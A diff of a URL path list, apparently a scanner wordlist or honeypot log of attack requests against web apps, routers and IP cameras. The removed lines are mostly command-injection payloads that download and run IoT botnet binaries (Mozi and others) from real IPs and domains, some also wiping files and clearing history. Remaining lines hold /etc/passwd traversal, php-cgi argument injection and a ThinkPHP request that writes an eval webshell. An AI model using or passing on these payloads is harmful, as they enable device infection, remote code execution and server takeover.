@@ -307,9 +307,6 @@
 /cacti/plugins/weathermap/editor.php
 /cao/Admincenter/Index.index.do
 /cap.js?version=82908
-/card_scan_decoder.php?No=30&door=%60wget http:/switchnets.net/hoho.arm7; chmod 777 hoho.arm7; ./hoho.arm7 linear.selfrep%60
-/card_scan_decoder.php?No=30&door=%60wget http:/switchnets.net/hoho.arm7; chmod 777 hoho.arm7; ./hoho.arm7 linear%60
-/card_scan_decoder.php?No=30&door=%60wget%20http:/94.102.63.52/33bi/Ares.arm7;%20chmod%20777%20Ares.arm7;%20./Ares.arm7%20linear%60
 /cckj/config.js
 /cclei001/login.asp
 /ccmivr/IVRGetAudioFile.do?file=../../../../../../../../../../../../../../../etc/passwd
@@ -322,14 +319,10 @@
 /cgi-bin/auth_if.cgi?Login
 /cgi-bin/check.cgi?file=../../../etc/passwd
 /cgi-bin/chklogin.cgi?file=../../../etc/passwd
-/cgi-bin/diagnostic.cgi?select_mode_ping=on&ping_ipaddr=-q%20-s%200%20127.0.0.1;wget%20http:/45.95.168.177/g0away.sh;%20curl%20-O%20http:/45.95.168.177/g0away.sh;%20chmod%20777%20g0away.sh;%20sh%20g0away.sh%20wimax.exploit;&ping_count=1&action=Apply&html_view=ping
 /cgi-bin/gdrive.cgi?cmd=4&f_gaccount=;echo%20$((854625-1));echo%20ffffffffffffffff;
 /cgi-bin/mainfunction.cgi
-/cgi-bin/mainfunction.cgi?action=login&keyPath=%27%0A/bin/sh${IFS}-c${IFS}'cd${IFS}/tmp;${IFS}rm${IFS}-rf${IFS}arm7;${IFS}busybox${IFS}wget${IFS}http:/19ce033f.ngrok.io/arm7;${IFS}chmod${IFS}777${IFS}arm7;${IFS}./arm7'%0A%27&loginUser=a&loginPwd=a
-/cgi-bin/mainfunction.cgi?action=login&keyPath=%27%0A/bin/sh${IFS}-c${IFS}'cd${IFS}/tmp;${IFS}rm${IFS}-rf${IFS}arm7;${IFS}busybox${IFS}wget${IFS}http:/192.3.45.185/arm7;${IFS}chmod${IFS}777${IFS}arm7;${IFS}./arm7'%0A%27&loginUser=a&loginPwd=a
 /cgi-bin/nobody/
 /cgi-bin/nobody/nobody/loginQuick.htm
-/cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%20;XmlAp%20r%20Account.User1.Password%3E$(cd%20/tmp;%20wget%20http:/139.99.37.27/zzz/arm.idopoc%20-O%20lol;%20chmod%20777%20lol;%20./lol%20avtech)&password=admin
 /cgi-bin/php-cgi?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E
 /cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E
 /cgi-bin/php.cgi?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E
@@ -337,7 +330,6 @@
 /cgi-bin/php5?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E
 /cgi-bin/rdfs.cgi
 /cgi-bin/readfile.cgi?query=ADMINID
-/cgi-bin/rtpd.cgi?wget&http:/23.254.228.86/aws;chmod&777&aws;./aws;rm&-rf&aws
 /cgi-bin/test-cgi
 /cgi-bin/ViewLog.asp
 /cgi-bin/webproc
@@ -588,7 +580,6 @@
 /index.php?m=admin&c=index&a=login&dosubmit=1
 /index.php?param1=assert&param2=print(md5(57575848371));
 /index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP
-/index.php?s=/index/\think\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http:/scan.casualaffinity.net/x05010/888fff999.x86 -O .d41 ; chmod 777 .d41 ; ./.d41 ThinkPHP.exploit'
 /index.php?s=/module/action/param1/${@die(md5(HelloThinkPHP))}
 /index.php?s=%2f%69%6e%64%65%78%2f%5c%74%68%69%6e%6b%5c%61%70%70%2f%69%6e%76%6f%6b%65%66%75%6e%63%74%69%6f%6e&function=%63%61%6c%6c%5f%75%73%65%72%5f%66%75%6e%63%5f%61%72%72%61%79&vars[0]=%6d%645&vars[1][]=%48%65%6c%6c%6f%54%68%69%6e%6b%50%48%50
 /index.php?s=index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=file_put_contents&vars%5B1%5D%5B%5D=spread.php&vars%5B1%5D%5B%5D=%3C?php%20@eval($_POST%5Bspread%5D);?%3E
@@ -694,12 +685,6 @@
 /login_sid.lua
 /login?from=0.000000
 /login.action
-/login.cgi?cli=aa%20aa%27;wget%20http:/37.49.226.16/luoqxbocmkxnexy/tbox.mips%20-O%20->%20/tmp/leonn;chmod%20777%20/tmp/leonn;/tmp/leonn%20dlink.mips%27$
-/login.cgi?cli=aa%20aa%27;wget%20http:/37.49.226.231/luoqxbocmkxnexy/tbox.mips%20-O%20->%20/tmp/leonn;chmod%20777%20/tmp/leonn;/tmp/leonn%20dlink.mips%27$
-/login.cgi?cli=aa%20aa%27;wget%20http:/45.14.224.22/bins/Solstice.mips%20-O%20->%20/tmp/.Solstice;chmod%20777%20/tmp/.Solstice;/tmp/.Solstice%20dlink%27$
-/login.cgi?cli=aa%20aa%27;wget%20http:/80.211.112.150/k%20-O%20/tmp/ks;chmod%20777%20/tmp/ks;sh%20/tmp/ks%27$
-/login.cgi?cli=aa%20aa%27;wget%20http:/178.238.236.119/mips%20-O%20->%20/tmp/leonn;chmod%20777%20/tmp/leonn;/tmp/leonn%20dlink.mips%27$
-/login.cgi?cli=aa%20aa%27;wget%20http:/185.216.215.13/luoqxbocmkxnexy/tbox.mips%20-O%20->%20/tmp/leonn;chmod%20777%20/tmp/leonn;/tmp/leonn%20dlink.mips%27$
 /login.cgi?logout=1
 /login.do
 /login.html
@@ -1198,7 +1183,6 @@
 /phpNyAdmin/index.php
 /phppgadmin/scripts/setup.php
 /phppma/index.php
-/ping.cmd?action=view&task=ping&ip=;cd%20/tmp;%20wget%20http:/83.166.241.216/richard;%20curl%20-O%20http:/83.166.241.216/richard;%20chmod%20+x%20richard;%20./richard;%20rm%20-rf%20richard
 /pk10%E5%BC%80%E5%A5%96%E5%99%A8/kkjj/config.js
 /play/272/video.m3u8
 /plugins/weathermap/editor.php
@@ -1237,7 +1221,6 @@
 /public/admin/ueditor/dialogs/internal.js
 /Public/home/appjs/Index.js
 /public/index.php
-/public/index.php?s=/Index/%09hink%07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl%20wget%20http:/142.11.248.196/snype.x86;%20chmod%20777%20snype.x86;%20./snype.x86%20thinkphp;
 /public/index.php?s=/Index/%09hink%07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl%2037.49.226.35/thinkphp
 /public/ly/order.html
 /public/static/.gitignore
@@ -1287,36 +1270,7 @@
 /setSystemCommand
 /setup
 /setup.cgi
-/setup.cgi?next_file=afr.cfg&todo=syscmd&cmd=wget%20http:/23.254.211.179/Antisocial.mips%20-O%20/var/tmp/Antisocial.mips;%20chmod%20777%20/var/tmp/Antisocial.mips;%20/var/tmp/Antisocial.mips;%20rm%20-rf%20/var/tmp/Antisocial.mips&curpath=/&currentsetting.htm=1
-/setup.cgi?next_file=afr.cfg&todo=syscmd&cmd=wget%20http:/45.95.168.177/0xxx0xxxasdajshdsajhkgdja/Sa0aS.mips%20-O%20/var/tmp/Sa0aS.mips;%20chmod%20777%20/var/tmp/Sa0aS.mips;%20/var/tmp/Sa0aS.mips;%20rm%20-rf%20/var/tmp/Sa0aS.mips&curpath=/&currentsetting.htm=1
-/setup.cgi?next_file=afr.cfg&todo=syscmd&cmd=wget%20http:/45.95.168.228/0xxx0xxxasdajshdsajhkgdja/Sa0aS.mips%20-O%20/var/tmp/Sa0aS.mips;%20chmod%20777%20/var/tmp/Sa0aS.mips;%20/var/tmp/Sa0aS.mips%20africo.exploit;%20rm%20-rf%20/var/tmp/Sa0aS.mips&curpath=/&currentsetting.htm=1
-/setup.cgi?next_file=afr.cfg&todo=syscmd&cmd=wget%20http:/45.95.168.228/africo%20-O%20/var/tmp/africo;%20chmod%20777%20/var/tmp/africo;%20/var/tmp/africo;%20rm%20-rf%20/var/tmp/africo&curpath=/&currentsetting.htm=1
-/setup.cgi?next_file=afr.cfg&todo=syscmd&cmd=wget%20http:/185.172.110.240/mips%20-O%20/var/tmp/mips;%20chmod%20777%20/var/tmp/mips;%20/var/tmp/mips;%20rm%20-rf%20/var/tmp/mips&curpath=/&currentsetting.htm=1
 /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=busybox&curpath=/&currentsetting.htm=1
-/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http:/1.246.222.41:3798/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
-/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http:/1.246.222.153:3273/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
-/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http:/45.161.255.91:44253/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
-/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http:/49.89.68.175:46044/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
-/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http:/49.89.170.185:44738/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
-/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http:/61.52.131.12:48195/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
-/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http:/111.42.66.21:49141/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
-/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http:/111.43.223.55:52398/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
-/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http:/111.43.223.177:34408/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
-/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http:/114.226.82.152:42161/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
-/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http:/115.50.242.218:43242/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
-/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http:/115.202.238.125:51245/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
-/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http:/116.114.95.208:55546/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
-/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http:/120.69.91.70:58498/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
-/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http:/123.11.236.101:42389/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
-/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http:/140.240.159.35:59641/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
-/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http:/150.242.254.51:33700/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
-/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http:/172.45.3.142:41760/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
-/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http:/175.11.213.145:50557/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
-/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http:/176.113.161.125:47697/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
-/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http:/192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
-/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http:/211.137.225.134:38949/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
-/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http:/218.21.171.246:51546/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
-/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http:/222.74.186.132:60366/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
 /setup.php
 /sftp-config-alt.json
 /sftp-config-alt.json.save
@@ -1328,63 +1282,6 @@
 /sheep.php
 /shell?/bin/busybox+ABCD
 /shell?busybox
-/shell?cd%20/tmp;%20echo%20%3ENiGGeR%20%7C%7C%20cd%20/var;%20echo%20%3ENiGGeR;%20cp%20/bin/busybox%20yeet;%20%3Eyeet;%20chmod%20777%20yeet;%20nohup%20wget%20http:/%5C/161.35.105.211:80/yafsda.arm4%20-O%20yeet%20%7C%7C%20nohup%20tftp%20-r%20yafsda.arm4%20-g%20161.35.105.211%20-l%20yeet;%20chmod%20777%20yeet;./yeet;%20rm%20-rf%20yeeter%20%3E/dev/null%202%3E&1
-/shell?cd%20/tmp;wget%20http:/%5C/37.49.226.220/a-r.m-4.GHOUL;%20chmod%20777%20a-r.m-4.GHOUL;%20./a-r.m-4.GHOUL
-/shell?cd%20/tmp;wget%20http:/%5C/192.3.155.111/bins/sora.arm%20-O%20gf;%20chmod%20777%20gf;./gf%20jaws
-/shell?cd%20/tmp%20%7C%7C%20cd%20/run%20%7C%7C%20cd%20/;%20wget%20http:/45.77.138.85/asd.sh;%20chmod%20777%20asd.sh;%20sh%20asd.sh%20Cipher;%20tftp%2045.77.138.85%20-c%20get%20asdtftp1.sh;%20chmod%20777%20asdtftp1.sh;%20sh%20asdtftp1.sh%20Cipher;%20tftp%20-r%20asdtftp2.sh%20-g%2045.77.138.85;%20chmod%20777%20asdtftp2.sh;%20sh%20asdtftp2.sh%20Cipher;%20rm%20-rf%20asd.sh%20asdtftp1.sh%20asdtftp2.sh;%20rm%20-rf%20*;history%20-c
-/shell?cd%20/tmp%20%7C%7C%20cd%20/run%20%7C%7C%20cd%20/;%20wget%20http:/161.35.114.181/asd.sh;%20chmod%20777%20asd.sh;%20sh%20asd.sh%20Cipher;%20tftp%20161.35.114.181%20-c%20get%20asdtftp1.sh;%20chmod%20777%20asdtftp1.sh;%20sh%20asdtftp1.sh%20Cipher;%20tftp%20-r%20asdtftp2.sh%20-g%20161.35.114.181;%20chmod%20777%20asdtftp2.sh;%20sh%20asdtftp2.sh%20Cipher;%20rm%20-rf%20asd.sh%20asdtftp1.sh%20asdtftp2.sh;%20rm%20-rf%20*;history%20-c
-/shell?cd+/tmp;+rm+-rf+*;+wget+http:/45.148.10.194/arm7;+chmod+777+arm7;+./arm7+rep.arm7
-/shell?cd+/tmp;+rm+-rf+*;+wget+http:/178.238.236.119/arm7;+chmod+777+arm7;+./arm7+rep.arm7
-/shell?cd+/tmp;rm+-rf+*;wget+ 37.49.226.210/reaper/reap.arm4;chmod+777+/tmp/reap.arm4;sh+/tmp/reap.arm4
-/shell?cd+/tmp;rm+-rf+*;wget+ 45.84.196.162/reaper/reap.arm4;chmod+777+/tmp/reap.arm4;sh+/tmp/reap.arm4
-/shell?cd+/tmp;rm+-rf+*;wget+ 45.137.154.33/reaper/reap.arm4;chmod+777+/tmp/reap.arm4;sh+/tmp/reap.arm4
-/shell?cd+/tmp;rm+-rf+*;wget+ 46.29.167.45/reaper/reap.arm4;chmod+777+/tmp/reap.arm4;sh+/tmp/reap.arm4
-/shell?cd+/tmp;rm+-rf+*;wget+ 79.137.222.49/jaws;sh+/tmp/jaws
-/shell?cd+/tmp;rm+-rf+*;wget+ 172.245.52.231/jaws;sh+/tmp/jaws
-/shell?cd+/tmp;rm+-rf+*;wget+ 185.132.53.5/reaper/reap.arm4;chmod+777+/tmp/reap.arm4;sh+/tmp/reap.arm4
-/shell?cd+/tmp;rm+-rf+*;wget+ 185.158.249.80/reaper/reap.arm4;chmod+777+/tmp/reap.arm4;sh+/tmp/reap.arm4
-/shell?cd+/tmp;rm+-rf+*;wget+ 185.172.110.241/jaws;sh+/tmp/jaws
-/shell?cd+/tmp;rm+-rf+*;wget+ 185.205.209.205/jaws;sh+/tmp/jaws
-/shell?cd+/tmp;rm+-rf+*;wget+ 194.15.36.96/jaws;sh+/tmp/jaws
-/shell?cd+/tmp;rm+-rf+*;wget+ cnc.9iar.me/jaws;sh+/tmp/jaws
-/shell?cd+/tmp;rm+-rf+*;wget+ wf98n29cv.987pw9ewity32igqgfigef82leg2xv7ts8dtv9igi2e2ge7t.fun:44783/jaws;sh+/tmp/jax
-/shell?cd+/tmp;rm+-rf+*;wget+37.49.226.55/bins/arm7;chmod+777+/tmp/arm7;sh+/tmp/arm7+Melodic.rep.Jaws
-/shell?cd+/tmp;rm+-rf+*;wget+45.95.168.251/beastmode/b3astmode.arm7;chmod+777+/tmp/b3astmode.arm7;sh+/tmp/b3astmode.arm7+BeastMode.Rep.Jaws
-/shell?cd+/tmp;rm+-rf+*;wget+79.124.8.121/beastmode/b3astmode.arm7;chmod+777+/tmp/b3astmode.arm7;sh+/tmp/b3astmode.arm7+BeastMode.Rep.Jaws
-/shell?cd+/tmp;rm+-rf+*;wget+185.172.110.234/update.sh;chmod+777+/tmp/update.sh;sh+/tmp/update.sh+JAWS.REP
-/shell?cd+/tmp;rm+-rf+*;wget+185.172.111.214/bins/UnHAnaAW.x86;chmod+777+/tmp/UnHAnaAW.x86;sh+/tmp/UnHAnaAW.x86
-/shell?cd+/tmp;rm+-rf+*;wget+185.172.111.214/bins/UnHAnaAW.x86;chmod+777+/tmp/UnHAnaAW.x86;sh+/tmp/UnHAnaAW.x86+w00dy.jaws
-/shell?cd+/tmp;rm+-rf+*;wget+192.154.229.223/beastmode/b3astmode.arm7;chmod+777+/tmp/b3astmode.arm7;sh+/tmp/b3astmode.arm7+BeastMode.Rep.Jaws
-/shell?cd+/tmp;rm+-rf+*;wget+http:/1.246.223.125:3265/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws
-/shell?cd+/tmp;rm+-rf+*;wget+http:/27.41.154.146:34096/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws
-/shell?cd+/tmp;rm+-rf+*;wget+http:/27.41.176.134:45669/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws
-/shell?cd+/tmp;rm+-rf+*;wget+http:/36.105.58.151:55281/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws
-/shell?cd+/tmp;rm+-rf+*;wget+http:/36.107.136.66:39506/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws
-/shell?cd+/tmp;rm+-rf+*;wget+http:/42.232.223.173:48223/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws
-/shell?cd+/tmp;rm+-rf+*;wget+http:/42.236.161.183:40302/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws
-/shell?cd+/tmp;rm+-rf+*;wget+http:/45.172.169.177:35362/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws
-/shell?cd+/tmp;rm+-rf+*;wget+http:/49.82.192.122:38380/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws
-/shell?cd+/tmp;rm+-rf+*;wget+http:/111.42.66.48:57973/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws
-/shell?cd+/tmp;rm+-rf+*;wget+http:/113.103.56.38:45441/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws
-/shell?cd+/tmp;rm+-rf+*;wget+http:/114.226.80.165:59882/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws
-/shell?cd+/tmp;rm+-rf+*;wget+http:/114.226.85.23:39519/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws
-/shell?cd+/tmp;rm+-rf+*;wget+http:/120.69.88.166:37385/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws
-/shell?cd+/tmp;rm+-rf+*;wget+http:/121.226.177.125:35008/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws
-/shell?cd+/tmp;rm+-rf+*;wget+http:/162.212.113.178:55066/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws
-/shell?cd+/tmp;rm+-rf+*;wget+http:/172.36.26.223:51430/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws
-/shell?cd+/tmp;rm+-rf+*;wget+http:/172.36.38.78:37612/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws
-/shell?cd+/tmp;rm+-rf+*;wget+http:/172.45.8.40:55070/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws
-/shell?cd+/tmp;rm+-rf+*;wget+http:/175.10.145.71:60474/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws
-/shell?cd+/tmp;rm+-rf+*;wget+http:/180.104.184.29:57359/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws
-/shell?cd+/tmp;rm+-rf+*;wget+http:/180.116.220.200:44599/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws
-/shell?cd+/tmp;rm+-rf+*;wget+http:/182.120.10.203:39731/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws
-/shell?cd+/tmp;rm+-rf+*;wget+http:/182.126.91.143:54328/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws
-/shell?cd+/tmp;rm+-rf+*;wget+http:/192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws
-/shell?cd+/tmp;rm+-rf+*;wget+http:/199.83.203.82:56267/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws
-/shell?cd+/tmp;rm+-rf+*;wget+http:/220.168.236.193:60374/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws
-/shell?cd+/tmp;rm+-rf+*;wget+http:/222.81.31.69:48695/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws
-/shell?cd+/tmp;rm+-rf+*;wget+http:/223.15.28.218:42220/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws
-/shell?cd+/tmp;rm+-rf+*;wget+net.spoofedoxy.net/beastmode/b3astmode.arm7;chmod+777+/tmp/b3astmode.arm7;sh+/tmp/b3astmode.arm7+BeastMode.Rep.Jaws
 /shell?echo%20BKbFjTIa7HO2ajBz
 /shell.php
 /shop
@@ -1664,7 +1561,6 @@
 /web/wp-includes/wlwmanifest.xml
 /webadmin/
 /webadmin/login.php
-/webadmin/script?command=%7C%20wget%20http:/45.33.64.145/dreambox;%20curl%20-O%20http:/45.33.64.145/dreambox;%20chmod%20777%20dreambox;%20sh%20dreambox;%20rm%20-rf%20*
 /webadmin/scripts/setup.php
 /webapps/phpmyadmin/scripts/setup.php
 /webdav/
